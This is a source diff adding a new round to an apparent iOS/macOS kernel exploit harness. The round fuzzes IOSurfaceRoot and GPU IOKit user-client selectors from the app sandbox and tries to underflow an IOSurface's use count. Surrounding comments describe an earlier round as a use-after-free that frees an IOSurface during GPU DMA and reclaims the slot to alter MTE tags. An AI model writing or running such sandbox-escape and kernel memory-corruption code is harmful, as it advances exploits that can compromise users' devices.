@@ -1728,6 +1728,9 @@ static void *r259_unreg_fn(void *arg) {
     return NULL;
 }
 
+/* r261: IOKit GPU user client selector probe — find which selectors are
+   accessible from the app sandbox on IOGPUDevice and IOSurfaceRoot */
+
 /* r260: heap reclaim UAF — free IOSurface during encoder DMA, immediately
    reclaim the zone slot with a new allocation to change MTE tag */
 static volatile int r260_run = 0;
@@ -20397,6 +20400,172 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 261) {
+            rlog("*** rounds=261: IOKit GPU + IOSurface selector probe ***\n");
+            rlog("  Probing IOGPUDevice and IOSurfaceRoot user clients\n");
+            rlog("  Finding which selectors are accessible from app sandbox\n\n");
+
+            /* Probe IOSurfaceRoot selectors 0-30 */
+            rlog("=== IOSurfaceRoot selector probe ===\n");
+            io_service_t surf_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t surf_conn = IO_OBJECT_NULL;
+            kern_return_t kr;
+            if (surf_svc) {
+                kr = IOServiceOpen(surf_svc, mach_task_self(), 0, &surf_conn);
+                rlog("  IOSurfaceRoot open: kr=0x%x conn=%u\n", kr, surf_conn);
+            } else {
+                rlog("  IOSurfaceRoot: service not found!\n");
+            }
+
+            if (surf_conn) {
+                for (int sel = 0; sel <= 30; sel++) {
+                    if (sel == 17 || sel == 18) continue; /* already known */
+                    uint64_t inp[4] = {0, 0, 0, 0};
+                    uint32_t out_cnt = 4;
+                    uint64_t out[4] = {0};
+                    size_t struct_out_sz = 256;
+                    char struct_out[256] = {0};
+                    char struct_in[64] = {0};
+
+                    /* Try scalar-only first */
+                    kr = IOConnectCallMethod(surf_conn, sel, inp, 1, NULL, 0,
+                                            out, &out_cnt, NULL, NULL);
+                    rlog("  sel%d scalar: kr=0x%x", sel, kr);
+                    if (kr == 0) rlog(" out[0]=0x%llx", out[0]);
+
+                    /* Try struct-only */
+                    kr = IOConnectCallMethod(surf_conn, sel, NULL, 0,
+                                            struct_in, 24, NULL, NULL,
+                                            struct_out, &struct_out_sz);
+                    rlog(" struct: kr=0x%x", kr);
+                    if (kr == 0) rlog(" outsz=%zu", struct_out_sz);
+                    rlog("\n");
+                }
+
+                /* Now try sel1 with a real IOSurface ID to see if it releases */
+                rlog("\n  --- sel1 test with real IOSurface ---\n");
+                IOSurfaceRef test_surf = NULL;
+                {
+                    CFMutableDictionaryRef tp = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int tw = 64, th = 64, tbpe = 4, tbpr = tw * tbpe, tpf = 0x42475241;
+                    CFNumberRef tn1 = CFNumberCreate(NULL, kCFNumberIntType, &tw);
+                    CFNumberRef tn2 = CFNumberCreate(NULL, kCFNumberIntType, &th);
+                    CFNumberRef tn3 = CFNumberCreate(NULL, kCFNumberIntType, &tbpe);
+                    CFNumberRef tn4 = CFNumberCreate(NULL, kCFNumberIntType, &tbpr);
+                    CFNumberRef tn5 = CFNumberCreate(NULL, kCFNumberIntType, &tpf);
+                    CFDictionarySetValue(tp, CFSTR("IOSurfaceWidth"), tn1);
+                    CFDictionarySetValue(tp, CFSTR("IOSurfaceHeight"), tn2);
+                    CFDictionarySetValue(tp, CFSTR("IOSurfaceBytesPerElement"), tn3);
+                    CFDictionarySetValue(tp, CFSTR("IOSurfaceBytesPerRow"), tn4);
+                    CFDictionarySetValue(tp, CFSTR("IOSurfacePixelFormat"), tn5);
+                    test_surf = IOSurfaceCreate(tp);
+                    CFRelease(tn1); CFRelease(tn2); CFRelease(tn3); CFRelease(tn4); CFRelease(tn5);
+                    CFRelease(tp);
+                }
+                if (test_surf) {
+                    IOSurfaceID sid = IOSurfaceGetID(test_surf);
+                    int use_before = IOSurfaceGetUseCount(test_surf);
+                    rlog("  Created IOSurface ID=%u useCount=%d\n", sid, use_before);
+
+                    /* Try sel1 with surface ID as scalar */
+                    uint64_t sid64 = sid;
+                    kr = IOConnectCallMethod(surf_conn, 1, &sid64, 1, NULL, 0, NULL, NULL, NULL, NULL);
+                    rlog("  sel1(scalar sid=%u): kr=0x%x\n", sid, kr);
+
+                    /* Try sel1 with surface ID as struct */
+                    uint32_t sid32 = sid;
+                    kr = IOConnectCallMethod(surf_conn, 1, NULL, 0, &sid32, 4, NULL, NULL, NULL, NULL);
+                    rlog("  sel1(struct sid=%u): kr=0x%x\n", sid, kr);
+
+                    /* Check if surface is still alive */
+                    IOSurfaceRef found = IOSurfaceLookup(sid);
+                    rlog("  After sel1: lookup=%p\n", (void*)found);
+                    if (found) CFRelease(found);
+
+                    /* Try IOSurfaceDecrementUseCount to lower use count */
+                    IOSurfaceIncrementUseCount(test_surf);
+                    rlog("  After increment: useCount=%d\n", IOSurfaceGetUseCount(test_surf));
+                    IOSurfaceDecrementUseCount(test_surf);
+                    rlog("  After decrement: useCount=%d\n", IOSurfaceGetUseCount(test_surf));
+                    IOSurfaceDecrementUseCount(test_surf);
+                    rlog("  After 2nd decrement: useCount=%d\n", IOSurfaceGetUseCount(test_surf));
+                    IOSurfaceDecrementUseCount(test_surf);
+                    rlog("  After 3rd decrement (underflow?): useCount=%d\n", IOSurfaceGetUseCount(test_surf));
+
+                    /* Check if purgeable */
+                    uint32_t old_state = 0;
+                    kr = IOSurfaceSetPurgeable(test_surf, 1 /* kIOSurfacePurgeableVolatile */, &old_state);
+                    rlog("  SetPurgeable(volatile): kr=0x%x old=%u\n", kr, old_state);
+
+                    CFRelease(test_surf);
+                }
+
+                IOServiceClose(surf_conn);
+                IOObjectRelease(surf_svc);
+            }
+
+            /* Probe IOGPUDevice */
+            rlog("\n=== IOGPUDevice selector probe ===\n");
+            CFMutableDictionaryRef gpu_match = IOServiceMatching("IOGPUDevice");
+            io_iterator_t gpu_iter;
+            kr = IOServiceGetMatchingServices(kIOMasterPortDefault, gpu_match, &gpu_iter);
+            rlog("  GetMatchingServices: kr=0x%x\n", kr);
+
+            io_service_t gpu_svc = IOIteratorNext(gpu_iter);
+            if (!gpu_svc) {
+                /* Try AGXAccelerator */
+                rlog("  No IOGPUDevice, trying AGXAccelerator...\n");
+                gpu_match = IOServiceMatching("AGXAccelerator");
+                IOServiceGetMatchingServices(kIOMasterPortDefault, gpu_match, &gpu_iter);
+                gpu_svc = IOIteratorNext(gpu_iter);
+            }
+            if (!gpu_svc) {
+                /* Try IOGPU */
+                rlog("  No AGXAccelerator, trying IOGPU...\n");
+                gpu_match = IOServiceMatching("IOGPU");
+                IOServiceGetMatchingServices(kIOMasterPortDefault, gpu_match, &gpu_iter);
+                gpu_svc = IOIteratorNext(gpu_iter);
+            }
+
+            if (gpu_svc) {
+                io_name_t svc_name;
+                IORegistryEntryGetName(gpu_svc, svc_name);
+                rlog("  Found GPU service: %s\n", svc_name);
+
+                /* Try opening with different types */
+                for (uint32_t type = 0; type <= 5; type++) {
+                    io_connect_t gpu_conn = IO_OBJECT_NULL;
+                    kr = IOServiceOpen(gpu_svc, mach_task_self(), type, &gpu_conn);
+                    rlog("  Open type=%u: kr=0x%x conn=%u\n", type, kr, gpu_conn);
+                    if (kr == 0 && gpu_conn) {
+                        /* Probe selectors */
+                        for (int sel = 0; sel <= 30; sel++) {
+                            uint64_t inp[4] = {0};
+                            uint32_t out_cnt = 4;
+                            uint64_t out[4] = {0};
+                            kr = IOConnectCallMethod(gpu_conn, sel, inp, 1, NULL, 0,
+                                                    out, &out_cnt, NULL, NULL);
+                            if (kr != 0xe00002c7 && kr != 0xe00002bc) {
+                                /* Not kIOReturnNotPermitted or kIOReturnUnsupported */
+                                rlog("    type%u sel%d: kr=0x%x", type, sel, kr);
+                                if (kr == 0) rlog(" out[0]=0x%llx", out[0]);
+                                rlog("\n");
+                            }
+                        }
+                        IOServiceClose(gpu_conn);
+                    }
+                }
+                IOObjectRelease(gpu_svc);
+            } else {
+                rlog("  No GPU service found!\n");
+            }
+            IOObjectRelease(gpu_iter);
+
+            rlog("\n*** r=261 complete ***\n");
             goto done;
         }
         if (rounds == 260) {
